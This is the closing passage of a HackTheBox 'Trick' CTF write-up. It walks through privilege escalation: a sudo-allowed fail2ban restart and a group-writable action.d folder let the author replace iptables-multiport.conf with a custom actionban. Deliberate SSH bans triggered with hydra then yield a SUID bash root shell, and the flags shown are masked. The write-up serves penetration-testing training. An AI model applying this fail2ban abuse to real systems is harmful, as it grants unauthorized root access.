+</span></span><span class="line"><span class="cl">michael@trick:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And we&rsquo;re in.</p>
+<h3 id="usertxt">user.txt</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">michael@trick:~$ ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">84</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">15</span> michael michael <span class="m">4096</span> Oct <span class="m">29</span> 08:34 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root    root    <span class="m">4096</span> May <span class="m">25</span> 13:28 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root    root       <span class="m">9</span> Apr <span class="m">22</span>  <span class="m">2022</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> michael michael  <span class="m">220</span> Apr <span class="m">18</span>  <span class="m">2019</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> michael michael <span class="m">3526</span> Apr <span class="m">18</span>  <span class="m">2019</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">9</span> michael michael <span class="m">4096</span> May <span class="m">11</span> 21:09 .cache
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">10</span> michael michael <span class="m">4096</span> May <span class="m">11</span> 21:08 .config
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> michael michael <span class="m">4096</span> May <span class="m">11</span> 21:07 Desktop
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> michael michael <span class="m">4096</span> May <span class="m">11</span> 21:07 Documents
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> michael michael <span class="m">4096</span> May <span class="m">11</span> 21:07 Downloads
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">3</span> michael michael <span class="m">4096</span> May <span class="m">11</span> 21:08 .gnupg
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> michael michael <span class="m">1256</span> May <span class="m">25</span> 13:09 .ICEauthority
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">3</span> michael michael <span class="m">4096</span> May <span class="m">11</span> 21:07 .local
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> michael michael <span class="m">4096</span> May <span class="m">11</span> 21:07 Music
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> michael michael <span class="m">4096</span> May <span class="m">11</span> 21:07 Pictures
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> michael michael  <span class="m">807</span> Apr <span class="m">18</span>  <span class="m">2019</span> .profile
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> michael michael <span class="m">4096</span> May <span class="m">11</span> 21:07 Public
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> michael michael   <span class="m">86</span> Oct <span class="m">29</span> 08:34 .python_history
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> michael michael <span class="m">4096</span> May <span class="m">24</span> 17:25 .ssh
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> michael michael <span class="m">4096</span> May <span class="m">11</span> 21:07 Templates
+</span></span><span class="line"><span class="cl">-rw-r-----  <span class="m">1</span> root    michael   <span class="m">33</span> Oct <span class="m">29</span> 07:52 user.txt
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> michael michael <span class="m">4096</span> May <span class="m">11</span> 21:07 Videos
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">michael@trick:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">1a****************************ef
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">michael@trick:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p><code>sudo -l</code> shows we can run <code>/etc/init.d/fail2ban restart</code> as <code>root</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">michael@trick:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> michael on trick:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User michael may run the following commands on trick:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/fail2ban restart
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">michael@trick:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>fail2ban<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Fail2ban is an intrusion prevention software framework. Written in the Python programming language, it is designed to prevent against brute-force attacks. It is able to run on POSIX systems that have an interface to a packet-control system or firewall installed locally, such as iptables or TCP Wrapper.</div>
+        </div>
+    </div>
+<p>Source: <a href="https://en.wikipedia.org/wiki/Fail2ban" target="_blank" rel="noopener noreffer ">https://en.wikipedia.org/wiki/Fail2ban</a></p>
+<p>Looking up for PrivEsc using <code>fail2ban</code> I came accross <a href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7" target="_blank" rel="noopener noreffer ">this</a> article.</p>
+<p>We have almost the same scenario as the above article.</p>
+<p>We also have <code>ssh</code> service enabled in the <code>/etc/fail2ban/jail.conf</code> file.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/8.png" title="ssh service enabled in jail.conf" data-thumbnail="/hackthebox-trick/8.png" data-sub-html="<h2>ssh service enabled in jail.conf</h2><p>ssh service enabled in jail.conf</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/8.png"
+            data-srcset="/hackthebox-trick/8.png, /hackthebox-trick/8.png 1.5x, /hackthebox-trick/8.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/8.png" width="1919" height="307" />
+    </a><figcaption class="image-caption">ssh service enabled in jail.conf</figcaption>
+    </figure></p>
+<p>Now since we can restart <code>fail2ban</code> as root what we have to do now is to inject our custom command as <code>actionban</code> in <code>/etc/fail2ban/action.d/iptables-multiport.conf</code> file.</p>
+<p>Sadly we don&rsquo;t have write permissions on the file.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/9.png" title="/etc/fail2ban/action.d/iptables-multiport.conf permissions" data-thumbnail="/hackthebox-trick/9.png" data-sub-html="<h2>/etc/fail2ban/action.d/iptables-multiport.conf permissions</h2><p>/etc/fail2ban/action.d/iptables-multiport.conf permissions</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/9.png"
+            data-srcset="/hackthebox-trick/9.png, /hackthebox-trick/9.png 1.5x, /hackthebox-trick/9.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/9.png" width="1904" height="61" />
+    </a><figcaption class="image-caption">/etc/fail2ban/action.d/iptables-multiport.conf permissions</figcaption>
+    </figure></p>
+<p>But luckily we are part of a group <code>security</code> and this group has write permissions on the <code>/etc/fail2ban/action.d</code> folder.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/10.png" title="write permissions" data-thumbnail="/hackthebox-trick/10.png" data-sub-html="<h2>write permissions</h2><p>write permissions</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/10.png"
+            data-srcset="/hackthebox-trick/10.png, /hackthebox-trick/10.png 1.5x, /hackthebox-trick/10.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/10.png" width="1919" height="497" />
+    </a><figcaption class="image-caption">write permissions</figcaption>
+    </figure></p>
+<p>Now the attack scenario is as follows.</p>
+<p>We will delete the original <code>iptables-multiport.conf</code> file and replace it with our custom made file. Then we will restart the <code>fail2ban</code> service and finally attempt to login via <code>ssh</code> 5 times via brute-forcing or manually. And this will execute our command as <code>actionban</code>.</p>
+<p>Now changing the <code>iptables-multiport.conf</code> file as follows</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/11.png" title="actionban" data-thumbnail="/hackthebox-trick/11.png" data-sub-html="<h2>actionban</h2><p>actionban</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/11.png"
+            data-srcset="/hackthebox-trick/11.png, /hackthebox-trick/11.png 1.5x, /hackthebox-trick/11.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/11.png" width="1920" height="508" />
+    </a><figcaption class="image-caption">actionban</figcaption>
+    </figure></p>
+<p>Then deleting the previous one and fetching the new one.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/12.png" title="Deleting original and fetching new one" data-thumbnail="/hackthebox-trick/12.png" data-sub-html="<h2>Deleting original and fetching new one</h2><p>Deleting original and fetching new one</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/12.png"
+            data-srcset="/hackthebox-trick/12.png, /hackthebox-trick/12.png 1.5x, /hackthebox-trick/12.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/12.png" width="1911" height="168" />
+    </a><figcaption class="image-caption">Deleting original and fetching new one</figcaption>
+    </figure></p>
+<p>Restarting the <code>fail2ban</code> service.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/13.png" title="Restart fail2ban" data-thumbnail="/hackthebox-trick/13.png" data-sub-html="<h2>Restart fail2ban</h2><p>Restart fail2ban</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/13.png"
+            data-srcset="/hackthebox-trick/13.png, /hackthebox-trick/13.png 1.5x, /hackthebox-trick/13.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/13.png" width="1915" height="37" />
+    </a><figcaption class="image-caption">Restart fail2ban</figcaption>
+    </figure></p>
+<p>Now brute-force the ssh login via <code>hydra</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/14.png" title="Brute-forcing ssh login via hydra" data-thumbnail="/hackthebox-trick/14.png" data-sub-html="<h2>Brute-forcing ssh login via hydra</h2><p>Brute-forcing ssh login via hydra</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/14.png"
+            data-srcset="/hackthebox-trick/14.png, /hackthebox-trick/14.png 1.5x, /hackthebox-trick/14.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/14.png" width="1920" height="150" />
+    </a><figcaption class="image-caption">Brute-forcing ssh login via hydra</figcaption>
+    </figure></p>
+<p>Now looking at the <code>bash</code> binary, it has the SUID bit set.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-trick/15.png" title="SUID bash" data-thumbnail="/hackthebox-trick/15.png" data-sub-html="<h2>SUID bash</h2><p>SUID bash</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-trick/15.png"
+            data-srcset="/hackthebox-trick/15.png, /hackthebox-trick/15.png 1.5x, /hackthebox-trick/15.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-trick/15.png" width="1918" height="83" />
+    </a><figcaption class="image-caption">SUID bash</figcaption>
+    </figure></p>
+<h3 id="roottxt">root.txt</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-5.0# <span class="nb">cd</span> /root/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash-5.0# ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">56</span>
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">8</span> root root <span class="m">4096</span> Jun  <span class="m">7</span> 03:33 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">19</span> root root <span class="m">4096</span> May <span class="m">25</span> 13:28 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Apr <span class="m">22</span>  <span class="m">2022</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">570</span> Jan <span class="m">31</span>  <span class="m">2010</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> root root <span class="m">4096</span> May <span class="m">25</span> 13:28 .cache
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">5</span> root root <span class="m">4096</span> May <span class="m">25</span> 13:28 .config
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">139</span> Apr <span class="m">22</span>  <span class="m">2022</span> f2b.sh
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">6</span> root root <span class="m">4096</span> Jun <span class="m">12</span> 01:29 fail2ban
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">3</span> root root <span class="m">4096</span> May <span class="m">25</span> 13:28 .gnupg
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> May <span class="m">25</span> 13:28 .local
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">148</span> Aug <span class="m">17</span>  <span class="m">2015</span> .profile
+</span></span><span class="line"><span class="cl">-rw-r-----  <span class="m">1</span> root root   <span class="m">33</span> Oct <span class="m">29</span> 07:52 root.txt
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root   <span class="m">66</span> Jun  <span class="m">7</span> 03:32 .selected_editor
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root <span class="m">1342</span> Jun  <span class="m">7</span> 03:33 set_dns.sh
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> root root <span class="m">4096</span> May <span class="m">25</span> 13:28 .ssh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash-5.0# cat root.txt 
+</span></span><span class="line"><span class="cl">31****************************6c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash-5.0#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-10-29</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hackthebox-trick/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/hackthebox-trick/" data-title="HackTheBox - Trick" data-via="ssaadakhtarr" data-hashtags="hackthebox,machines"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/hackthebox-trick/" data-hashtag="hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/hackthebox-trick/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">hackthebox</a>,&nbsp;<a href="/tags/machines/">machines</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hackthebox-opensource/" class="prev" rel="prev" title="HackTheBox - OpenSource"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - OpenSource</a>
+            <a href="/hackthebox-shared/" class="next" rel="next" title="Hackthebox - Shared">Hackthebox - Shared<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
